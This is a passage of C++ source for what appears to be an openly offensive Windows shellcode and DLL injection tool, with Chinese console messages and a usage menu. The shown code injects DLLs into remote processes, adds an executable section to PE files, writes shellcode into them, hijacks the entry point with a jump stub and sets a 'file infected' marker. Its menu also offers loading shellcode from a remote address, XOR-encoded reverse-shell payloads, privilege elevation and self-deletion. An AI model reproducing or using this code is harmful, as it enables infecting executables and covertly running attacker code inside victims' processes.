		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)dwFuncAddress, lpAddr, 0, NULL);
		if (NULL == hThread)
		{
			return FALSE;
		}
		return TRUE;
	}

	void ShowProcessDllName(DWORD Pid)
	{
		HMODULE hBaseAddress = NULL;
		char szDllNameArray[MAX_PATH][MAX_PATH] = { 0 };
		DWORD dwDllNum = 0;
		DWORD64 dwAddressArray[MAX_PATH] = { 0 };
		DWORD dwIndex = 0;
		BOOL b32 = FALSE;
		HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
		IsWow64Process(hProcess, &b32);
		GetProcessBaseAddress(&hBaseAddress, hProcess);
		GetProcessDllName(hProcess, hBaseAddress, szDllNameArray, dwDllNum, b32);
		for (dwIndex = 0; dwIndex < dwDllNum; dwIndex++)
		{
			dwAddressArray[dwIndex] = GetProcessDllBaseAddress(hProcess, hBaseAddress, szDllNameArray[dwIndex], b32);
		}
		for (dwIndex = 0; dwIndex < dwDllNum; dwIndex++)
		{
			printf("[+] DLL名称: %20s | DLL基地址: 0x%016X \n", szDllNameArray[dwIndex], dwAddressArray[dwIndex]);
		}
	}

	void GetProcessDllFunctionAddress(DWORD Pid, char* lpszDllName, char* lpszDllFunctionName)
	{
		HMODULE hBaseAddress = NULL;
		BOOL b32 = FALSE;
		HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
		if (NULL == hProcess)
		{
			return;
		}
		::IsWow64Process(hProcess, &b32);
		GetProcessBaseAddress(&hBaseAddress, hProcess);
		DWORD64 dwDllBaseAddress = GetProcessDllBaseAddress(hProcess, hBaseAddress, lpszDllName, b32);
		DWORD64 dwDllFuncAddress = GetFuncInDll(hProcess, dwDllBaseAddress, lpszDllFunctionName, b32);
		printf("[+] 函数地址: 0x%x \n", dwDllFuncAddress);
	}

	BOOL FreeProcessDll(DWORD Pid, char* DllName)
	{
		HANDLE hProcess, hThread;
		HMODULE hModule = NULL;
		MODULEENTRY32 me = { sizeof(me) };
		LPTHREAD_START_ROUTINE pThreadProc;
		if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid)))
			return FALSE;
		hModule = GetModuleHandle("kernel32.dll");
		pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "FreeLibrary");
		hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		if (hThread != 0)
		{
			CloseHandle(hThread);
			return TRUE;
		}
		return FALSE;
	}
}

namespace PEInjectModule
{
	DWORD AlignSize(int nSecSize, DWORD Alignment)
	{
		int nSize = nSecSize;
		if (nSize % Alignment != 0)
			nSecSize = (nSize / Alignment + 1) * Alignment;
		return nSecSize;
	}

	DWORD ImplantSection(LPSTR szFileName, char szSecName[8], int nSecSize)
	{
		HANDLE m_hFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == m_hFile)
		{
			printf("[-] 打开文件出错 \n");
			exit(0);
		}
		HANDLE m_hMap = CreateFileMapping(m_hFile, NULL, PAGE_READWRITE, 0, 0, 0);
		if (INVALID_HANDLE_VALUE == m_hMap)
		{
			printf("[-] 创建映射出错 \n");
			exit(0);
		}
		HANDLE m_lpBase = MapViewOfFile(m_hMap, FILE_MAP_READ | FILE_SHARE_WRITE, 0, 0, 0);
		if (INVALID_HANDLE_VALUE == m_lpBase)
		{
			printf("[-] 映射失败 \n");
			exit(0);
		}
		PIMAGE_DOS_HEADER m_pDosHdr = (PIMAGE_DOS_HEADER)m_lpBase;
		if (NULL == m_lpBase || 0 == m_lpBase)
		{
			printf("[-] 无效PE文件 \n");
			exit(0);
		}
		printf("[-] 当前DOS头: 0x%16X \n", m_pDosHdr);
		PIMAGE_NT_HEADERS m_pNtHdr = (PIMAGE_NT_HEADERS)((DWORD)m_lpBase + m_pDosHdr->e_lfanew);
		printf("[-] 当前NT头: 0x%016X \n", m_pNtHdr);
		PIMAGE_SECTION_HEADER m_pSecHdr = (PIMAGE_SECTION_HEADER)((DWORD)& (m_pNtHdr->OptionalHeader) + m_pNtHdr->FileHeader.SizeOfOptionalHeader);
		printf("[-] 定位当前节表首地址: 0x%08X \n", m_pSecHdr);
		int nSecNum = m_pNtHdr->FileHeader.NumberOfSections;
		DWORD dwFileAlignment = m_pNtHdr->OptionalHeader.FileAlignment;
		DWORD dwSecAlignment = m_pNtHdr->OptionalHeader.SectionAlignment;
		PIMAGE_SECTION_HEADER pTmpSec = m_pSecHdr + nSecNum;
		strncpy((char*)pTmpSec->Name, szSecName, 7);
		printf("[+] 拷贝节名称: %s \n", szSecName);
		pTmpSec->Misc.VirtualSize = AlignSize(nSecSize, dwSecAlignment);
		printf("[+] 节表内存大小: %d \n", nSecSize);
		pTmpSec->VirtualAddress = m_pSecHdr[nSecNum - 1].VirtualAddress + AlignSize(m_pSecHdr[nSecNum - 1].Misc.VirtualSize, dwSecAlignment);
		printf("[*] 节内存起始位置: 0x%08X \n", pTmpSec->VirtualAddress);
		pTmpSec->SizeOfRawData = AlignSize(nSecSize, dwFileAlignment);
		printf("[-] 节的文件大小: %d \n", pTmpSec->SizeOfRawData);
		pTmpSec->PointerToRawData = SetFilePointer(m_hFile, 0, 0, FILE_END);
		printf("[*] 节的文件起始位置: 0x%08X => DEC: %d \n", pTmpSec->PointerToRawData, pTmpSec->PointerToRawData);
		for (int x = 0; x < nSecSize; x++)
			WriteFile(m_hFile, "", 1, 0, 0);
		pTmpSec->Characteristics = 0xE0000020;
		m_pNtHdr->FileHeader.NumberOfSections++;
		m_pNtHdr->OptionalHeader.SizeOfImage += pTmpSec->Misc.VirtualSize;
		FlushViewOfFile(m_lpBase, 0);
		return pTmpSec->PointerToRawData;
	}

	DWORD AllocateSpace(char* FileName, int FileSize)
	{
		HANDLE hFile = CreateFile(FileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
		DWORD ret = SetFilePointer(hFile, 0, 0, FILE_END);
		if (ret != NULL)
		{
			for (int x = 0; x < FileSize; x++)
			{
				WriteFile(hFile, "", 1, 0, 0);
			}
			CloseHandle(hFile);
		}
		return ret;
	}

	void WritePEShellCode(const char* FilePath, long FileOffset, const char* ShellCode)
	{
		HANDLE hFile = NULL;
		FILE* fpointer = NULL;
		DWORD dwNum = 0;
		int count = 0;
		char shellcode[8192] = { 0 };
		unsigned char save[8192] = { 0 };
		if ((fpointer = fopen(ShellCode, "r")) != NULL)
		{
			char ch = 0;
			for (int x = 0; (ch = fgetc(fpointer)) != EOF;)
			{
				if (ch != L'\n' && ch != L'\"' && ch != L'\\' && ch != L'x' && ch != L';')
				{
					shellcode[x++] = ch;
					count++;
				}
			}
		}
		_fcloseall();
		for (int x = 0; x < count / 2; x++)
		{
			unsigned int char_in_hex;
			if (shellcode[x] != 0)
			{
				sscanf(shellcode + 2 * x, "%02X", &char_in_hex);
				if ((x + 1) % 16 == 0)
				{
					printf("0x%02X \n", char_in_hex);
				}
				else
				{
					printf("0x%02X ", char_in_hex);
				}
				save[x] = char_in_hex;
			}
		}
		hFile = CreateFile(FilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE != hFile)
		{
			SetFilePointer(hFile, FileOffset, NULL, FILE_BEGIN);
			BOOL ref = WriteFile(hFile, save, count / 2, &dwNum, NULL);
			if (TRUE == ref)
			{
				printf("\n\n[*] 已注入 ShellCode 到PE文件 \n[+] 注入起始FOA => 0x%08X <DEC = %d > 注入结束FOA => 0x%08X <DEC = %d > \n",
					FileOffset, FileOffset, FileOffset + (count / 2), FileOffset + (count / 2));
			}
			CloseHandle(hFile);
		}
	}

	unsigned char SetHeadShellCode[] = "\x90\x90\x90\x90\xb8\x90\x90\x90\x90\xff\xe0\x00";

	void SetPeJmpHeader(const char* FilePath, long StartFileOffset, long EndFileOffset)
	{
		HANDLE hFile, hMap = NULL;
		LPVOID lpBase = NULL;
		hFile = CreateFile(FilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			printf("[-] 打开文件出错 \n");
			exit(0);
		}
		hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
		if (INVALID_HANDLE_VALUE == hMap)
		{
			printf("[-] 创建映射失败 \n");
			exit(0);
		}
		lpBase = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
		if (INVALID_HANDLE_VALUE == lpBase)
		{
			printf("[-] 映射失败 \n");
			exit(0);
		}
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
		PIMAGE_NT_HEADERS pNtHeader = NULL;
		PIMAGE_SECTION_HEADER pSec = NULL;
		IMAGE_SECTION_HEADER imgSec = { 0 };
		if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		{
			printf("[-] 文件非PE可执行文件 \n");
			exit(0);
		}
		pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)lpBase + pDosHeader->e_lfanew);
		DWORD dwOep = pNtHeader->OptionalHeader.ImageBase + pNtHeader->OptionalHeader.AddressOfEntryPoint;
		printf("[+] 获取原OEP => 0x%08X \n", dwOep);
		*(DWORD*)&SetHeadShellCode[5] = dwOep;
		printf("[+] 在 ShellCode 尾部增加JMP跳转指令: ");
		for (int x = 0; x < 15; x++)
		{
			printf("0x%02X ", SetHeadShellCode[x]);
		}
		printf("\n");
		DWORD dwNum = 0;
		SetFilePointer(hFile, EndFileOffset, NULL, FILE_BEGIN);
		BOOL ref = WriteFile(hFile, SetHeadShellCode, sizeof(SetHeadShellCode), &dwNum, NULL);
		if (TRUE == ref)
		{
			printf("[*] 已增加跳转到 0x%08X 处的代码段 \n", EndFileOffset);
		}
		pNtHeader->OptionalHeader.AddressOfEntryPoint = StartFileOffset;
		printf("[+] 修正新入口地址: 0x%08X \n", pNtHeader->OptionalHeader.ImageBase + StartFileOffset);
		UnmapViewOfFile(lpBase);
		CloseHandle(hMap);
		CloseHandle(hFile);
	}

#define VIRUSFLAGS 0xCCCC
	BOOL WriteSig(DWORD dwAddr, DWORD dwSig, HANDLE hFile)
	{
		DWORD dwNum = 0;
		SetFilePointer(hFile, dwAddr, 0, FILE_BEGIN);
		WriteFile(hFile, &dwSig, sizeof(DWORD), &dwNum, NULL);
		return TRUE;
	}

	BOOL CheckSig(DWORD dwAddr, DWORD dwSig, HANDLE hFile)
	{
		DWORD dwSigNum = 0;
		DWORD dwNum = 0;
		SetFilePointer(hFile, dwAddr, 0, FILE_BEGIN);
		ReadFile(hFile, &dwSigNum, sizeof(DWORD), &dwNum, NULL);
		if (dwSigNum == dwSig)
			return TRUE;
		return FALSE;
	}

	void SetSigFlag(const char* FilePath)
	{
		HANDLE hFile, hMap = NULL;
		LPVOID lpBase = NULL;
		hFile = CreateFile(FilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
		lpBase = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
		PIMAGE_NT_HEADERS pNtHeader = NULL;
		PIMAGE_SECTION_HEADER pSec = NULL;
		IMAGE_SECTION_HEADER imgSec = { 0 };
		if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		{
			printf("[-] 文件非可执行文件 \n");
			exit(0);
		}
		pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)lpBase + pDosHeader->e_lfanew);
		if (CheckSig(offsetof(IMAGE_DOS_HEADER, e_cblp), VIRUSFLAGS, hFile))
		{
			printf("[-] 文件已被感染,无法重复感染. \n");
			exit(0);
		}
		BOOL flag = WriteSig(offsetof(IMAGE_DOS_HEADER, e_cblp), VIRUSFLAGS, hFile);
		if (TRUE == flag)
		{
			printf("[+] 文件已感染 \n");
			exit(0);
		}
	}
}

int main(int argc, char* argv[])
{
	if (argc == 1)
	{
		fprintf(stderr,
			" _            ___        _           _             \n"
			"| |   _   _  |_ _|_ __  (_) ___  ___| |_ ___  _ __ \n"
			"| |  | | | |  | || '_ \\ | |/ _ \\/ __| __/ _ \\| '__|\n"
			"| |__| |_| |  | || | | || |  __/ (__| || (_) | |   \n"
			"|_____\\__, | |___|_| |_|/ |\\___|\\___|\\__\\___/|_|   \n"
			"      |___/           |__/                         \n\n"
			"---------------------------------------------------------- \n"
			"[*] 反汇编代码注入器 \n"
			"[+] 版本: 2.0.0 \n"
			"[+] 作者: me@lyshark.com \n"
			"---------------------------------------------------------- \n\n"
			"  [+] 基础功能\n\n"
			"\t Show              显示当前所有可注入进程 \n"
			"\t ShowDll           显示进程内的所有DLL模块 \n"
			"\t Promote           尝试提升自身进程权限 \n"
			"\t FreeDll           尝试卸载指定进程内的DLL模块 \n"
			"\t GetFuncAddr       显示进程内特定模块内函数基址 \n"
			"\t Delself           从系统中删除自身痕迹 \n\n"
			"  [+] 格式化功能\n\n"
			"\t Format            将字节数组格式化为一行并打印 \n"
			"\t FormatFile        将字节数组格式化并写出到文件 \n"
			"\t Xor               将文本中压缩后的字节数组进行异或并输出 \n"
			"\t Xchg              将压缩后的字符串转为字节数组格式 \n"
			"\t XorArray          将字节数组加密/解密为字节数组格式 \n\n"
			"  [+] 进程注入功能\n\n"
			"\t InjectDLL         注入DLL模块到特定进程内 \n"
			"\t InjectSelfShell   注入字符串到自身进程并运行 \n"
			"\t InjectArrayByte   注入字节数组到自身进程并运行 \n"
			"\t FileInjectShell   从文件中读入字符串并注入运行 \n"
			"\t InjectProcShell   注入字符串到远程进程并运行 \n"
			"\t InjectWebShell    从远程加载字符串并注入自身进程 \n"
			"\t AddSection        在PE文件中新增一个节区 \n"
			"\t InsertShellCode   将ShellCode插入到PE中的指定位置处 \n"
			"\t RepairShellOep    在ShellCode末尾增加跳转回原处的指令 \n"
			"\t SetSigFlag        设置文件感染标志 \n\n"
			"  [+] 编码器\n\n"
			"\t EncodeInFile      从文件读入加密字符串并执行反弹 \n"
			"\t EncodePidInFile   注入加密后的字符串到远程进程中 \n\n"
			);
	}
	if (argc == 2)
	{
		if (strcmp(argv[1], "Show") == 0)
		{
			ShellCodeInjectModule::EnumProcess();
		}
		if (strcmp(argv[1], "Promote") == 0)
		{
			if (ShellCodeInjectModule::IncreaseSelfAuthority() == FALSE)
			{
				printf("[-] 权限提升失败. \n");
			}
			else
			{
				printf("[*] 已提升. \n");
			}
		}
		if (strcmp(argv[1], "Delself") == 0)
		{
			if (ShellCodeInjectModule::SelfDel() == TRUE)
			{
				printf("[*] 自身已清除. \n");
			}
			else
			{
				printf("[-] 删除失败. \n");
			}
		}
	}
	if (argc == 4)
	{
		if ((strcmp(argv[1], "Format") == 0) && (strcmp(argv[2], "--path") == 0))
		{
			ShellCodeInjectModule::Compressed(argv[3]);
		}
		if ((strcmp(argv[1], "InjectSelfShell") == 0) && (strcmp(argv[2], "--shellcode") == 0))
		{
			ShellCodeInjectModule::InjectSelfCode(argv[3]);
		}
		if ((strcmp(argv[1], "InjectArrayByte") == 0) && (strcmp(argv[2], "--path") == 0))
		{
			ShellCodeInjectModule::CompressedOnFormat(argv[3]);
		}
		if ((strcmp(argv[1], "FileInjectShell") == 0) && (strcmp(argv[2], "--path") == 0))
		{
			ShellCodeInjectModule::ReadShellCodeOnMemory(argv[3]);
		}
		if (strcmp((char*)argv[1], "ShowDll") == 0 && strcmp((char*)argv[2], "--proc") == 0)
		{
			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
			if (pid != 0xFFFFFFFF)
			{
				printf("\n");
				DllInjectModule::ShowProcessDllName(pid);
			}
			else
			{
				printf("[+] 请指定一个正在运行的进程 \n");
				return 0;
			}
		}
		if (argc == 4)
		{
			if (strcmp((char*)argv[1], "SetSigFlag") == 0 && strcmp((char*)argv[2], "--path") == 0)
			{
				PEInjectModule::SetSigFlag(argv[3]);
			}
		}
	}
	if (argc == 6)
	{
		if ((strcmp(argv[1], "FormatFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--output") == 0))
		{
			ShellCodeInjectModule::CompressedToFile(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "Xor") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
		{
			ShellCodeInjectModule::XorShellCode(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "Xchg") == 0) && (strcmp(argv[2], "--input") == 0) && (strcmp(argv[4], "--output") == 0))
		{
			ShellCodeInjectModule::XchgShellCode(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "XorArray") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
		{
			ShellCodeInjectModule::XorEncodeDeCode(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "InjectProcShell") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--shellcode") == 0))
		{
			ShellCodeInjectModule::InjectCode(atoi(argv[3]), argv[5]);
		}
		if ((strcmp(argv[1], "InjectWebShell") == 0) && (strcmp(argv[2], "--address") == 0) && (strcmp(argv[4], "--payload") == 0))
		{
			ShellCodeInjectModule::WebPageBounceShellCode(argv[3], argv[5]);
		}
		if ((strcmp(argv[1], "EncodeInFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
		{
			ShellCodeInjectModule::ReadXorShellCodeOnMemory(argv[3], argv[5]);
		}
		if (strcmp((char*)argv[1], "InjectDLL") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4], "--dll") == 0)
		{
			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
			if (pid != 0xFFFFFFFF)
			{
				BOOL flag = DllInjectModule::RemoteProcessInject(pid, argv[5]);
				if (flag == TRUE)
				{
					printf("[*] 模块 [ %s ] 已被注入到 [ %d ] 进程 \n", argv[5], pid);
				}
				else
				{
					printf("[-] 模块注入失败 \n");
				}
			}
			else
			{
				printf("[+] 请指定一个正在运行的进程 \n");
				return 0;
			}
		}
		if (strcmp((char*)argv[1], "FreeDll") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4], "--dll") == 0)
		{
			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
			if (pid != 0xFFFFFFFF)
			{
				printf("\n");
				BOOL ref = DllInjectModule::FreeProcessDll(pid, argv[5]);
				printf("[*] 模块卸载状态: %d \n", ref);
			}
			else
			{
				printf("[+] 请指定一个正在运行的进程 \n");
				return 0;
			}
		}
	}
	if (argc == 8)
	{
		if ((strcmp(argv[1], "EncodePidInFile") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--path") == 0) && (strcmp(argv[6], "--passwd") == 0))
		{
			ShellCodeInjectModule::InjectXorCode(atoi(argv[3]), argv[5], argv[7]);
		}
		if (strcmp((char*)argv[1], "GetFuncAddr") == 0 && strcmp((char*)argv[2], "--proc") == 0 &&
			strcmp((char*)argv[4], "--dll") == 0 && strcmp((char*)argv[6], "--func") == 0
			)
		{
			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
			if (pid != 0xFFFFFFFF)
			{
				printf("\n");
				DllInjectModule::GetProcessDllFunctionAddress(pid, argv[5], argv[7]);
			}
			else
			{
				printf("[+] 请指定一个正在运行的进程 \n");
				return 0;
			}
		}
		if (strcmp((char*)argv[1], "AddSection") == 0
			&& strcmp((char*)argv[2], "--path") == 0
			&& strcmp((char*)argv[4], "--section") == 0
			&& strcmp((char*)argv[6], "--size") == 0
			)
		{
			PEInjectModule::ImplantSection(argv[3], argv[5], atoi(argv[7]));
			Sleep(1000);
			PEInjectModule::AllocateSpace(argv[3], atoi(argv[7]));
		}
		if (strcmp((char*)argv[1], "InsertShellCode") == 0
			&& strcmp((char*)argv[2], "--path") == 0
			&& strcmp((char*)argv[4], "--shellcode") == 0
			&& strcmp((char*)argv[6], "--offset") == 0
			)
		{
			PEInjectModule::WritePEShellCode(argv[3], atoi(argv[7]), argv[5]);
		}
		if (strcmp((char*)argv[1], "RepairShellOep") == 0
			&& strcmp((char*)argv[2], "--path") == 0
			&& strcmp((char*)argv[4], "--start_offset") == 0
			&& strcmp((char*)argv[6], "--end_offset") == 0
			)
		{
			PEInjectModule::SetPeJmpHeader((char*)argv[3], atoi(argv[5]), atoi(argv[7]));
		}
	}
	return 0;
}